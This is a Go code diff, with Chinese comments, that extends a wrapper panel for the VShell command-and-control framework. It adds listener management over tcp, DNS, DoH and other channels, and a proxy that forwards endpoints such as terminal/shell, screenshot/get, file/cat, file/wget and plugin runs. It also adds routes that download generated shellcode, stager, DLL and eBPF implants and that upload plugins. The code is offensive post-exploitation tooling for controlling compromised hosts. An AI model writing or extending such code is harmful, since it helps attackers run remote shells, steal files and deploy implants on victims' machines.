@@ -298,6 +298,70 @@ func (c *VshellClient) uploadMultipart(ctx context.Context, hostID int64, dir, f
 	}
 }
 
+// uploadFile 通用 multipart 上传(单 file 字段,任意路径)。
+func (c *VshellClient) uploadFile(ctx context.Context, path, filename string, content []byte) error {
+	c.mu.Lock()
+	defer c.mu.Unlock()
+	if c.token == "" {
+		if err := c.login(ctx); err != nil {
+			return err
+		}
+	}
+	var buf bytes.Buffer
+	writer := multipart.NewWriter(&buf)
+	part, err := writer.CreateFormFile("file", filename)
+	if err == nil {
+		_, err = part.Write(content)
+	}
+	if err == nil {
+		err = writer.Close()
+	}
+	if err != nil {
+		return err
+	}
+	for retried := false; ; {
+		req, err := http.NewRequestWithContext(ctx, "POST", c.base+path, bytes.NewReader(buf.Bytes()))
+		if err != nil {
+			return err
+		}
+		req.Header.Set("Authorization", c.basicAuth)
+		req.Header.Set("Token", c.token)
+		req.Header.Set("Content-Type", writer.FormDataContentType())
+		req.ContentLength = int64(buf.Len())
+		resp, err := (&http.Client{Timeout: 120 * time.Second}).Do(req)
+		if err != nil {
+			return fmt.Errorf("VShell %s 上传失败:%v", path, err)
+		}
+		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
+		resp.Body.Close()
+		if resp.StatusCode == 401 && !retried {
+			c.token = ""
+			if err := c.login(ctx); err != nil {
+				return err
+			}
+			retried = true
+			continue
+		}
+		var env struct {
+			Code    int    `json:"code"`
+			Message string `json:"message"`
+		}
+		_ = json.Unmarshal(body, &env)
+		if env.Code == 401 && !retried {
+			c.token = ""
+			if err := c.login(ctx); err != nil {
+				return err
+			}
+			retried = true
+			continue
+		}
+		if env.Code != 0 {
+			return vshellErr(path, env.Code, env.Message)
+		}
+		return nil
+	}
+}
+
 // Hosts 上线主机清单(status=false = 含历史离线台账)。
 func (c *VshellClient) Hosts(ctx context.Context, onlineOnly bool) ([]json.RawMessage, error) {
 	res, err := c.API(ctx, "client/list", map[string]any{"page": 1, "pageSize": 9999, "status": onlineOnly})
@@ -1053,4 +1117,226 @@ func toInt(v any) int64 {
 		return out
 	}
 	return 0
+}
+
+// =====================================================================
+// vshell 4.9.3 全功能对齐(接口形态来自 2.10.1 web 前端实测与 bundle 逆向)
+// =====================================================================
+
+// Listener 监听行(/listener/list 字段)。
+type Listener struct {
+	Id                 int64  `json:"Id"`
+	Remark             string `json:"Remark"`
+	Mode               string `json:"Mode"` // tcp|kcp|ws|dns|doh|dot|oss
+	ListenAddr         string `json:"ListenAddr"`
+	ConnectAddr        string `json:"ConnectAddr"`
+	WsConnectAddr      string `json:"WsConnectAddr,omitempty"`
+	DNSDomain          string `json:"DNSDomain,omitempty"`
+	PublicDNS          string `json:"PublicDNS,omitempty"`
+	MaxDNSsize         int64  `json:"MaxDNSsize,omitempty"`
+	DisconnectTimeout  int64  `json:"DisconnectTimeout"`
+	PingInterval       int64  `json:"PingInterval"`
+	Vkey               string `json:"Vkey"`
+	EncryptSalt        string `json:"EncryptSalt"`
+	OssUrl             string `json:"OssUrl,omitempty"`
+	Status             bool   `json:"Status"`
+}
+
+// listenerAddRequest 新增/编辑监听表单(字段名与 vshell 端点逐字对齐)。
+type listenerAddRequest struct {
+	Mode              string `json:"Mode"`
+	Remark            string `json:"Remark"`
+	ListenAddr        string `json:"ListenAddr"`
+	ConnectAddr       string `json:"ConnectAddr"`
+	WsConnectAddr     string `json:"WsConnectAddr,omitempty"`
+	DNSDomain         string `json:"DNSDomain,omitempty"`
+	PublicDNS         string `json:"PublicDNS,omitempty"`
+	MaxDNSsize        *int64 `json:"MaxDNSsize,omitempty"`
+	DisconnectTimeout int64  `json:"DisconnectTimeout"`
+	PingInterval      int64  `json:"PingInterval"`
+	Vkey              string `json:"Vkey"`
+	EncryptSalt       string `json:"EncryptSalt"`
+	OssUrl            string `json:"OssUrl,omitempty"`
+}
+
+// vshellListenersFull 监听清单(status=false 含离线)。
+func (c *VshellClient) listenersFull(ctx context.Context) ([]json.RawMessage, error) {
+	res, err := c.API(ctx, "listener/list", map[string]any{"page": 1, "pageSize": 9999})
+	if err != nil {
+		return nil, err
+	}
+	var page struct {
+		Items []json.RawMessage `json:"items"`
+	}
+	if err := json.Unmarshal(res, &page); err != nil {
+		return nil, fmt.Errorf("listener/list 输出异常")
+	}
+	return page.Items, nil
+}
+
+// vshellGeneric 站点任意 /api/{endpoint} 调用(前端通用转发,错误透传)。
+func (s *Server) vshellGeneric(w http.ResponseWriter, r *http.Request) {
+	server, st, ok := s.getVshellServerByID(w, r)
+	if !ok {
+		return
+	}
+	var req struct {
+		Endpoint string          `json:"endpoint"`
+		Body     json.RawMessage `json:"body"`
+		TimeoutS int             `json:"timeout_s"`
+	}
+	if !decodeShellJSON(w, r, &req) {
+		return
+	}
+	endpoint := strings.Trim(strings.TrimSpace(req.Endpoint), "/")
+	if endpoint == "" || strings.ContainsAny(endpoint, "?#") || strings.Contains(endpoint, "..") {
+		writeErr(w, http.StatusBadRequest, "endpoint 非法")
+		return
+	}
+	// 白名单:vshell 已知业务端点(避免开放代理任意路径)
+	allowed := map[string]bool{}
+	for _, p := range []string{
+		"client/list", "client/add", "client/editremark", "client/delfile", "client/delprocess", "client/dellist",
+		"listener/list", "listener/add", "listener/edit", "listener/editremark", "listener/del", "listener/dellist",
+		"listener/start", "listener/stop",
+		"tunnel/list", "tunnel/add", "tunnel/edit", "tunnel/editremark", "tunnel/del", "tunnel/dellist",
+		"tunnel/start", "tunnel/stop",
+		"terminal/shell", "screenshot/get",
+		"runner/list", "runner/runplugin",
+		"setting/get", "setting/edit",
+		"install/install", "install/remove",
+		"file/ls", "file/cat", "file/edit", "file/mkdir", "file/rm", "file/rmlist", "file/mv", "file/touch",
+		"file/wget", "file/upload", "file/getdisk", "file/modifytime", "file/getdownloadper",
+		"file/downloadtoserver", "file/downloadtooss",
+		"dashboard/info", "error-log/list",
+	} {
+		allowed[p] = true
+	}
+	if !allowed[endpoint] {
+		writeErr(w, http.StatusBadRequest, "端点不在白名单:"+endpoint)
+		return
+	}
+	timeout := 60 * time.Second
+	if req.TimeoutS > 0 && req.TimeoutS <= 300 {
+		timeout = time.Duration(req.TimeoutS) * time.Second
+	}
+	ctx, cancel := context.WithTimeout(r.Context(), timeout)
+	defer cancel()
+	var body any
+	if len(req.Body) > 0 {
+		if err := json.Unmarshal(req.Body, &body); err != nil {
+			writeErr(w, http.StatusBadRequest, "body 非法 JSON:"+err.Error())
+			return
+		}
+	}
+	res, err := vshellClientFor(server).API(ctx, endpoint, body)
+	if err != nil {
+		st.LogShellOp("vshell", server.ID, "api."+endpoint+".fail", string(req.Body))
+		writeErr(w, http.StatusBadGateway, err.Error())
+		return
+	}
+	st.LogShellOp("vshell", server.ID, "api."+endpoint, string(req.Body))
+	if res == nil {
+		writeJSON(w, http.StatusOK, map[string]any{"result": nil})
+		return
+	}
+	writeJSON(w, http.StatusOK, map[string]any{"result": json.RawMessage(res)})
+}
+
+// vshellClientDownload 客户端生成代理:/download/* 端点流式回浏览器。
+// path: stage|shellcode|stageless|dll|listen|listendll|ebpf
+func (s *Server) vshellClientDownload(w http.ResponseWriter, r *http.Request) {
+	server, st, ok := s.getVshellServerByID(w, r)
+	if !ok {
+		return
+	}
+	kind := r.PathValue("kind")
+	switch kind {
+	case "stage", "shellcode", "stageless", "dll", "listen", "listendll", "ebpf":
+	default:
+		writeErr(w, http.StatusBadRequest, "未知生成类型 "+kind)
+		return
+	}
+	client := vshellClientFor(server)
+	client.mu.Lock()
+	if client.token == "" {
+		client.mu.Unlock()
+		ctx, cancel := context.WithTimeout(r.Context(), 60*time.Second)
+		defer cancel()
+		if err := client.login(ctx); err != nil {
+			writeErr(w, http.StatusBadGateway, err.Error())
+			return
+		}
+		client.mu.Lock()
+	}
+	token := client.token
+	client.mu.Unlock()
+
+	q := r.URL.RawQuery
+	if q == "" {
+		q = r.URL.Query().Encode()
+	}
+	target := "/api/download/" + kind
+	if q != "" {
+		target += "?" + q
+	}
+	req, err := http.NewRequestWithContext(r.Context(), "GET", client.base+target, nil)
+	if err != nil {
+		writeErr(w, http.StatusInternalServerError, err.Error())
+		return
+	}
+	req.Header.Set("Authorization", client.basicAuth)
+	req.Header.Set("Token", token)
+	resp, err := (&http.Client{Timeout: 10 * time.Minute}).Do(req)
+	if err != nil {
+		writeErr(w, http.StatusBadGateway, "生成请求失败:"+err.Error())
+		return
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode == 401 {
+		writeErr(w, http.StatusBadGateway, "vshell 登录态失效——重试一次")
+		return
+	}
+	if resp.StatusCode != 200 {
+		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
+		writeErr(w, http.StatusBadGateway, fmt.Sprintf("生成失败(HTTP %d):%s", resp.StatusCode, string(body)))
+		return
+	}
+	st.LogShellOp("vshell", server.ID, "download."+kind, q)
+	w.Header().Set("Content-Type", "application/octet-stream")
+	w.Header().Set("Content-Disposition", resp.Header.Get("Content-Disposition"))
+	w.WriteHeader(http.StatusOK)
+	io.Copy(w, resp.Body)
+}
+
+// vshellRunnerUpload 插件上传代理:multipart file → vshell /runner/upload。
+func (s *Server) vshellRunnerUpload(w http.ResponseWriter, r *http.Request) {
+	server, st, ok := s.getVshellServerByID(w, r)
+	if !ok {
+		return
+	}
+	if err := r.ParseMultipartForm(64 << 20); err != nil {
+		writeErr(w, http.StatusBadRequest, "multipart 解析失败:"+err.Error())
+		return
+	}
+	file, header, err := r.FormFile("file")
+	if err != nil {
+		writeErr(w, http.StatusBadRequest, "缺少 file 字段")
+		return
+	}
+	defer file.Close()
+	content, err := io.ReadAll(file)
+	if err != nil {
+		writeErr(w, http.StatusBadRequest, "读取上传内容失败")
+		return
+	}
+	client := vshellClientFor(server)
+	ctx, cancel := context.WithTimeout(r.Context(), 30*time.Minute)
+	defer cancel()
+	if err := client.uploadFile(ctx, "/api/runner/upload", header.Filename, content); err != nil {
+		writeErr(w, http.StatusBadGateway, err.Error())
+		return
+	}
+	st.LogShellOp("vshell", server.ID, "runner.upload", header.Filename)
+	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "size": len(content)})
 }
